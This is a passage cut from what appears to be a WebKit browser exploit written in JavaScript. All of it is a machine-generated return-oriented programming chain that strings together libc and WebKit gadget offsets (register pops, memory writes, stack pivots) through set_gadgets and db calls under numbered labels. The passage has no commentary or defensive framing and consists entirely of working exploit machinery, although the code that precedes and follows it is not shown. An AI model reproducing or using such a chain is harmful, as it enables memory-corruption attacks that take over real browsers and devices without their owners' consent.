webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3129:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3130:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3131:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1183712, //L3133
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3133:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1183768, //L3134
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3134:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1183840, //L3137
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3137:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1183896, //L3138
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3138:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1121481, //mov [rax], cl
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
//L3140:
libc_base+764760, //pop rsi
ropchain+1184000, //L3142
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3141:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+763368,); //pop rcx
//L3142:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1184088, //L3144
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1184104, //L3145
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3144:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3145:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1184264, //L3148
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1184296, //L3150
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1184248, //L3147
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1184280, //L3149
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3147:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3148:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3149:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3150:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1184392, //L3152
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1184376, //L3151
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3151:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3152:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1184480, //L3154
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L3153:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L3154:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1184552, //L3156
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3155:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+763368,); //pop rcx
//L3156:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+3488438, //mov [rax], ecx
libc_base+764760, //pop rsi
ropchain+1184616, //L3159
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3159:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+782311, //pop rsp
ropchain+1178400, //L2999
//L3032:
libc_base+782311, //pop rsp
ropchain+1195032, //L3160
//L2987:
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1184728, //L3161
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L3161:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3162:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L3163:
db([1, 0]); // 0x1
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L3164:
db([2, 0]); // 0x2
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L3166:
ropchain+1184944, //L3165
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1205952, //L3167
//L3165:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1185032, //L3169
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3168:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+763368,); //pop rcx
//L3169:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+3488438, //mov [rax], ecx
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
//L3171:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1185136, //L3174
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L3173:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L3174:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
//L3175:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1185232, //L3178
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L3177:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L3178:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1185304, //L3180
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L3179:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L3180:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1185376, //L3182
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L3181:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L3182:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1185448, //L3184
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L3183:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L3184:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1185520, //L3186
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L3185:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L3186:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1185592, //L3188
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L3187:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L3188:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1185664, //L3190
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L3189:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L3190:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+1121481, //mov [rax], cl
libc_base+764760, //pop rsi
ropchain+1185736, //L3192
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L3191:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L3192:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3193:
db([4294967257, 4294967295]); // -0x27
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1185832, //L3196
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L3195:
db([2, 0]); // 0x2
set_gadget(libc_base+759608,); //pop rax
//L3196:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1121481, //mov [rax], cl
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3197:
db([4294967258, 4294967295]); // -0x26
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1185920, //L3199
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L3199:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3200:
db([15395, 0]); // 0x3c23
set_gadgets([
webkit_base+3914787, //mov [rdi], cx
libc_base+764760, //pop rsi
ropchain+1185992, //L3202
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+144605 //pop rdi
]);
//L3202:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L3203:
db([4294967260, 4294967295]); // -0x24
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1186072, //L3206
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L3205:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3206:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+3488438, //mov [rax], ecx
libc_base+764760, //pop rsi
ropchain+1186120, //L3207
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L3207:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3208:
db([16, 0]); // 0x10
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1186232, //L3210
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L3209:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+759608,); //pop rax
//L3210:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1186336, //L3212
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3211:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+763368,); //pop rcx
//L3212:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1186424, //L3214
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1186440, //L3215
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3214:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3215:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1186600, //L3218
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1186632, //L3220
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1186584, //L3217
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1186616, //L3219
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3217:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3218:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3219:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3220:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1186728, //L3222
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1186712, //L3221
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3221:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3222:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L3224:
ropchain+1186832, //L3223
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1199264, //L3225
//L3223:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608 //pop rax
]);
//L3226:
db([1, 0]); // 0x1
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1186968, //L3228
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3227:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+763368,); //pop rcx
//L3228:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1187056, //L3230
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1187072, //L3231
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3230:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3231:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1187232, //L3234
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1187264, //L3236
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1187216, //L3233
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1187248, //L3235
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3233:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3234:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3235:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3236:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1187360, //L3238
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1187344, //L3237
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3237:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3238:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L3240:
ropchain+1187464, //L3239
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1203248, //L3241
//L3239:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608 //pop rax
]);
//L3242:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L3243:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1187648, //L3245
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3244:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+763368,); //pop rcx
//L3245:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1187736, //L3247
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1187752, //L3248
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3247:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3248:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1187912, //L3251
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1187944, //L3253
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1187896, //L3250
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1187928, //L3252
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3250:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3251:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3252:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3253:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1188040, //L3255
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1188024, //L3254
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3254:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3255:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L3257:
ropchain+1188144, //L3256
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1200592, //L3258
//L3256:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1188288, //L3260
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1188304, //L3261
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1188272, //L3259
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3259:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3260:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3261:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1188424, //L3264
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1188392, //L3262
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+144605 //pop rdi
]);
//L3262:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L3263:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+763368,); //pop rcx
//L3264:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+3488438, //mov [rax], ecx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3266:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L3267:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1188568, //L3269
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1188584, //L3270
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3269:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3270:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1188704, //L3274
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1188672, //L3272
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+144605 //pop rdi
]);
//L3272:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L3273:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+763368,); //pop rcx
//L3274:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+20307877, //mov [rax], rcx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3276:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+763368,); //pop rcx
//L3277:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1188824, //L3280
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L3279:
db([131072, 0]); // 0x20000
set_gadget(libc_base+759608,); //pop rax
//L3280:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+3488438, //mov [rax], ecx
libc_base+764760, //pop rsi
ropchain+1188880, //L3282
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3282:
db([0, 0]); // 0x0
//L3281:
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1188944, //L3285
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3284:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+763368,); //pop rcx
//L3285:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1189032, //L3287
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1189048, //L3288
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3287:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3288:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1189208, //L3291
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1189240, //L3293
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1189192, //L3290
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1189224, //L3292
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3290:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3291:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3292:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3293:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1189320, //L3294
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1189336, //L3295
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3294:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3295:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1189448, //L3297
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1189496, //L3300
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1189464, //L3298
webkit_base+660161, //mov [rsi], rax ; mov al, 1
